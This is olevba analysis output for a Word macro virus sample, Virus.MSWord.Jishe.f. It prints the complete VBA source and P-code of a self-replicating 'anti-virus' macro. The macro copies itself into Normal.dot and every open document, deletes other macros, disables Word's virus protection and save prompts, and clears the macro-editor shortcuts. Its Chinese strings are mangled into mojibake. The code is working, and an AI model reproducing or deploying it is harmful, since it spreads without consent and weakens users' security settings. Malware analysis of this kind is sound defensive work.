olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jishe.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua33.bas 
in file: Virus.MSWord.Jishe.f - OLE stream: 'Macros/VBA/JiShenhua33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' ³ÌÐòÉè¼Æ: ¼½É÷»ª  ½¨ÐÐÉ½¶«Ê¡·ÖÐÐ
' ÈÕÆÚ: 2001Äê3ÔÂ
' ¹¦ÄÜ: ¸Ã³ÌÐò°ÑWORD²Ëµ¥Óë¹¤¾ßÌõ³õÊ¼»¯µ½Ô­À´×´Ì¬²¢É¾³ý±¾Ä£¿éÒÔÍâµÄºêÄ£¿é.
'-------------------------------------------------------------------------------------
Const CurrentVersion = 33 '°æ±¾ºÅ
Const myName = "JiShenhua33" '±¾³ÌÐòÃû
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
Sub FileSave()
On Error Resume Next
    Call Initialize
    Call Immunize
    If Not ActiveDocument.saved Then ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Function IsNewDoc(myDoc As Document) As Boolean
    Dim rightPart As String
    If (Left(myDoc.Name, 2) = "ÎÄµµ") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 2)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    ElseIf (Left(myDoc.Name, 3) = "Doc") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 3)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    Else
        IsNewDoc = False
    End If
End Function
Function Immunize()
On Error Resume Next
    
    Dim ModuleName$, OpenDocImmunized As Boolean
    Dim i%, j%, NmImmunized As Boolean
    Dim myInt As Integer
    Dim openDoc As Document
    
    NmImmunized = False
    For i = NormalTemplate.VBProject.VBComponents.count To 1 Step -1
        ModuleName = NormalTemplate.VBProject.VBComponents(i).Name
        Select Case ModuleName
        Case "ThisDocument"
            myInt = NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
            If myInt > 0 Then
                NormalTemplate.VBProject.VBComponents(i).CodeModule.DeleteLines 1, myInt
            End If
        Case "MyTools"
        Case "VirusReport", "JiShenhua" '¾É°æ±¾É±²¡¶¾³ÌÐò
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName, _
                Name:=ModuleName, _
                Object:=wdOrganizerObjectProjectItems
        Case Else
            If Left(ModuleName, 9) = "JiShenhua" Then '±¾³ÌÐò
                myInt = Val(Right(ModuleName, 2))
                If myInt < CurrentVersion Then 'µ±Ç°³ÌÐòµÄ¾É°æ±¾
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Else
                    NmImmunized = True 'ÊÇµ±Ç°°æ±¾»ò¸ü¸ß°æ±¾³ÌÐò
                End If
            Else 'ÆäËû³ÌÐò
                msg = "ÄãµÄ Word ÏµÍ³ÖÐ¸½´øÓÐºê³ÌÐòÄ£¿é " + ModuleName + _
                    ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
                If MsgBox(msg, vbYesNo, "¼½É÷»ªÏòÄú±¨¸æ:") = vbYes Then
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                End If
            End If
        End Select
    Next i
    
    For Each openDoc In Documents
        OpenDocImmunized = False
        For j = openDoc.VBProject.VBComponents.count To 1 Step -1
            ModuleName = openDoc.VBProject.VBComponents(j).Name
            Select Case ModuleName
                Case "ThisDocument"
                    myInt = openDoc.VBProject.VBComponents(j).CodeModule.CountOfLines
                    If myInt > 0 Then
                        openDoc.VBProject.VBComponents(j).CodeModule.DeleteLines 1, myInt
                    End If
                Case "Reference to Normal", "MyTools"
                Case "VirusReport", "JiShenhua" '¾É°æ±¾É±²¡¶¾³ÌÐò
                    Application.OrganizerDelete _
                        Source:=openDoc.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Case Else
                    If Left(ModuleName, 9) = "JiShenhua" Then '±¾³ÌÐò
                        myInt = Val(Right(ModuleName, 2))
                        If myInt < CurrentVersion Then 'µ±Ç°³ÌÐòµÄ¾É°æ±¾
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        Else
                            OpenDocImmunized = True 'ÊÇµ±Ç°°æ±¾»ò¸ü¸ß°æ±¾³ÌÐò
                        End If
                    Else 'ÓÐÆäËûÄ£¿é´æÔÚ
                        msg = "ÄúµÄÎÄ¼þ <" + openDoc.Name + "> ÖÐ¸½´øÓÐ Word ºêÄ£¿é " + ModuleName + _
                            ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
                        If MsgBox(msg, vbYesNo, "¼½É÷»ªÏòÄú±¨¸æ:") = vbYes Then
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        End If
                    End If
            End Select
        Next j
        'Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾³ÌÐò
        If Not OpenDocImmunized Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=openDoc.FullName, Name:=myName, _
                Object:=wdOrganizerObjectProjectItems
            If (Not IsNewDoc(openDoc)) And (Not openDoc.saved) Then
                openDoc.Save
            End If
        End If
    Next openDoc
    'ÏòNormalÖÐÐ´Èë±¾³ÌÐò
    If Not NmImmunized Then
        Application.OrganizerCopy _
            Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, _
            Name:=myName, _
            Object:=wdOrganizerObjectProjectItems
        If Not NormalTemplate.saved Then NormalTemplate.Save
    End If
End Function
Function Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros 1
   
    With Application
        .UserAddress = "¼½É÷»ªÒÑÎªÄúµÄ»úÆ÷°²×°ÁË·´ºê²¡¶¾³ÌÐò(v33),ÊÂÇ°Î´Õ÷ÇóÄúµÄÍ¬Òâ,Çë¼ûÁÂ."
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "¸ÃÎÄ¼þ¸½´øÓÐ¼½É÷»ª±àÐ´µÄ·´ºê²¡¶¾³ÌÐò(v33)."
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .Reset
      .Controls("Macro").Reset
      .Controls("Customize...").Reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
End Function
Sub CheckAllFiles()
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Jishe.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/JiShenhua33 - 9830 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0055 " ------------------------------------------------------------------------------------"
' Line #1:
' 	QuoteRem 0x0000 0x0021 " ³ÌÐòÉè¼Æ: ¼½É÷»ª  ½¨ÐÐÉ½¶«Ê¡·ÖÐÐ"
' Line #2:
' 	QuoteRem 0x0000 0x0010 " ÈÕÆÚ: 2001Äê3ÔÂ"
' Line #3:
' 	QuoteRem 0x0000 0x0048 " ¹¦ÄÜ: ¸Ã³ÌÐò°ÑWORD²Ëµ¥Óë¹¤¾ßÌõ³õÊ¼»¯µ½Ô­À´×´Ì¬²¢É¾³ý±¾Ä£¿éÒÔÍâµÄºêÄ£¿é."
' Line #4:
' 	QuoteRem 0x0000 0x0055 "-------------------------------------------------------------------------------------"
' Line #5:
' 	Dim (Const) 
' 	LitDI2 0x0021 
' 	VarDefn CurrentVersion
' 	QuoteRem 0x001A 0x0006 "°æ±¾ºÅ"
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000B "JiShenhua33"
' 	VarDefn myName
' 	QuoteRem 0x001D 0x0008 "±¾³ÌÐòÃû"
' Line #7:
' 	FuncDefn (Sub FileOpen())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #10:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #11:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #12:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub FileSave())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #17:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub FileSaveAs())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #23:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #24:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Function IsNewDoc(myDoc As ) As Boolean)
' Line #27:
' 	Dim 
' 	VarDefn rightPart (As String)
' Line #28:
' 	Ld myDoc 
' 	MemLd New 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "ÎÄµµ"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #29:
' 	Ld myDoc 
' 	MemLd New 
' 	Ld myDoc 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St rightPart 
' Line #30:
' 	Ld rightPart 
' 	ArgsLd IsNumeric 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St IsNewDoc 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St IsNewDoc 
' 	EndIf 
' Line #31:
' 	Ld myDoc 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Doc"
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #32:
' 	Ld myDoc 
' 	MemLd New 
' 	Ld myDoc 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St rightPart 
' Line #33:
' 	Ld rightPart 
' 	ArgsLd IsNumeric 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St IsNewDoc 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St IsNewDoc 
' 	EndIf 
' Line #34:
' 	ElseBlock 
' Line #35:
' 	LitVarSpecial (False)
' 	St IsNewDoc 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndFunc 
' Line #38:
' 	FuncDefn (Function Immunize())
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' Line #41:
' 	Dim 
' 	VarDefn ModuleName
' 	VarDefn OpenDocImmunized (As Boolean)
' Line #42:
' 	Dim 
' 	VarDefn i
' 	VarDefn j
' 	VarDefn NmImmunized (As Boolean)
' Line #43:
' 	Dim 
' 	VarDefn myInt (As Integer)
' Line #44:
' 	Dim 
' 	VarDefn openDoc
' Line #45:
' Line #46:
' 	LitVarSpecial (False)
' 	St NmImmunized 
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #48:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ModuleName 
' Line #49:
' 	Ld ModuleName 
' 	SelectCase 
' Line #50:
' 	LitStr 0x000C "ThisDocument"
' 	Case 
' 	CaseDone 
' Line #51:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St myInt 
' Line #52:
' 	Ld myInt 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #53:
' 	LitDI2 0x0001 
' 	Ld myInt 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	LitStr 0x0007 "MyTools"
' 	Case 
' 	CaseDone 
' Line #56:
' 	LitStr 0x000B "VirusReport"
' 	Case 
' 	LitStr 0x0009 "JiShenhua"
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0028 0x0010 "¾É°æ±¾É±²¡¶¾³ÌÐò"
' Line #57:
' 	LineCont 0x000C 03 00 10 00 09 00 10 00 0D 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #58:
' 	CaseElse 
' Line #59:
' 	Ld ModuleName 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "JiShenhua"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0036 0x0006 "±¾³ÌÐò"
' Line #60:
' 	Ld ModuleName 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St myInt 
' Line #61:
' 	Ld myInt 
' 	Ld CurrentVersion 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x002F 0x0010 "µ±Ç°³ÌÐòµÄ¾É°æ±¾"
' Line #62:
' 	LineCont 0x000C 03 00 18 00 09 00 18 00 0D 00 18 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	LitVarSpecial (True)
' 	St NmImmunized 
' 	QuoteRem 0x0027 0x0018 "ÊÇµ±Ç°°æ±¾»ò¸ü¸ß°æ±¾³ÌÐò"
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	ElseBlock 
' 	QuoteRem 0x0011 0x0008 "ÆäËû³ÌÐò"
' Line #67:
' 	LineCont 0x0004 06 00 14 00
' 	LitStr 0x0021 "ÄãµÄ Word ÏµÍ³ÖÐ¸½´øÓÐºê³ÌÐòÄ£¿é "
' 	Ld ModuleName 
' 	Add 
' 	LitStr 0x002A ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
' 	Add 
' 	St msg 
' Line #68:
' 	Ld msg 
' 	Ld vbYesNo 
' 	LitStr 0x000F "¼½É÷»ªÏòÄú±¨¸æ:"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	LineCont 0x000C 03 00 18 00 09 00 18 00 0D 00 18 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndSelect 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' Line #75:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #76:
' 	LitVarSpecial (False)
' 	St OpenDocImmunized 
' Line #77:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #78:
' 	Ld j 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ModuleName 
' Line #79:
' 	Ld ModuleName 
' 	SelectCase 
' Line #80:
' 	LitStr 0x000C "ThisDocument"
' 	Case 
' 	CaseDone 
' Line #81:
' 	Ld j 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St myInt 
' Line #82:
' 	Ld myInt 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #83:
' 	LitDI2 0x0001 
' 	Ld myInt 
' 	Ld j 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	LitStr 0x0013 "Reference to Normal"
' 	Case 
' 	LitStr 0x0007 "MyTools"
' 	Case 
' 	CaseDone 
' Line #86:
' 	LitStr 0x000B "VirusReport"
' 	Case 
' 	LitStr 0x0009 "JiShenhua"
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0030 0x0010 "¾É°æ±¾É±²¡¶¾³ÌÐò"
' Line #87:
' 	LineCont 0x000C 03 00 18 00 09 00 18 00 0D 00 18 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #88:
' 	CaseElse 
' Line #89:
' 	Ld ModuleName 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "JiShenhua"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x003E 0x0006 "±¾³ÌÐò"
' Line #90:
' 	Ld ModuleName 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St myInt 
' Line #91:
' 	Ld myInt 
' 	Ld CurrentVersion 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x0037 0x0010 "µ±Ç°³ÌÐòµÄ¾É°æ±¾"
' Line #92:
' 	LineCont 0x000C 03 00 20 00 09 00 20 00 0D 00 20 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #93:
' 	ElseBlock 
' Line #94:
' 	LitVarSpecial (True)
' 	St OpenDocImmunized 
' 	QuoteRem 0x0034 0x0018 "ÊÇµ±Ç°°æ±¾»ò¸ü¸ß°æ±¾³ÌÐò"
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	ElseBlock 
' 	QuoteRem 0x0019 0x000E "ÓÐÆäËûÄ£¿é´æÔÚ"
' Line #97:
' 	LineCont 0x0004 0C 00 1C 00
' 	LitStr 0x000A "ÄúµÄÎÄ¼þ <"
' 	Ld openDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0017 "> ÖÐ¸½´øÓÐ Word ºêÄ£¿é "
' 	Add 
' 	Ld ModuleName 
' 	Add 
' 	LitStr 0x002A ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
' 	Add 
' 	St msg 
' Line #98:
' 	Ld msg 
' 	Ld vbYesNo 
' 	LitStr 0x000F "¼½É÷»ªÏòÄú±¨¸æ:"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LineCont 0x000C 03 00 20 00 09 00 20 00 0D 00 20 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	EndSelect 
' Line #103:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #104:
' 	QuoteRem 0x0008 0x0018 "Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾³ÌÐò"
' Line #105:
' 	Ld OpenDocImmunized 
' 	Not 
' 	IfBlock 
' Line #106:
' 	LineCont 0x0008 09 00 10 00 13 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #107:
' 	Ld openDoc 
' 	ArgsLd IsNewDoc 0x0001 
' 	Not 
' 	Paren 
' 	Ld openDoc 
' 	MemLd saved 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #108:
' 	Ld openDoc 
' 	ArgsMemCall Save 0x0000 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	QuoteRem 0x0004 0x0014 "ÏòNormalÖÐÐ´Èë±¾³ÌÐò"
' Line #113:
' 	Ld NmImmunized 
' 	Not 
' 	IfBlock 
' Line #114:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #115:
' 	Ld NormalTemplate 
' 	MemLd saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	EndFunc 
' Line #118:
' 	FuncDefn (Function Initialize())
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' Line #121:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #122:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #123:
' Line #124:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #125:
' 	LitStr 0x0044 "¼½É÷»ªÒÑÎªÄúµÄ»úÆ÷°²×°ÁË·´ºê²¡¶¾³ÌÐò(v33),ÊÂÇ°Î´Õ÷ÇóÄúµÄÍ¬Òâ,Çë¼ûÁÂ."
' 	MemStWith UserAddress 
' Line #126:
' 	EndWith 
' Line #127:
' Line #128:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #129:
' 	LitStr 0x002A "¸ÃÎÄ¼þ¸½´øÓÐ¼½É÷»ª±àÐ´µÄ·´ºê²¡¶¾³ÌÐò(v33)."
' 	MemStWith Comments 
' Line #130:
' 	ArgsMemCallWith Execute 0x0000 
' Line #131:
' 	EndWith 
' Line #132:
' Line #133:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #134:
' 	LitVarSpecial (True)
' 	MemStWith ConfirmConversions 
' Line #135:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #136:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #137:
' 	EndWith 
' Line #138:
' Line #139:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #140:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #141:
' 	EndWith 
' Line #142:
' Line #143:
' 	StartWithExpr 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #144:
' 	LitVarSpecial (True)
' 	MemStWith Enabled 
' Line #145:
' 	Ld msoBarTypeMenuBar 
' 	MemStWith Protection 
' Line #146:
' 	Ld msoBarMenuBar 
' 	MemStWith Protection 
' Line #147:
' 	EndWith 
' Line #148:
' Line #149:
' 	StartWithExpr 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #150:
' 	ArgsMemCallWith Reset 0x0000 
' Line #151:
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #152:
' 	LitStr 0x000C "Customize..."
' 	ArgsMemLdWith Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #153:
' 	EndWith 
' Line #154:
' Line #155:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #156:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #157:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #158:
' 	EndFunc 
' Line #159:
' 	FuncDefn (Sub CheckAllFiles())
' Line #160:
' Line #161:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

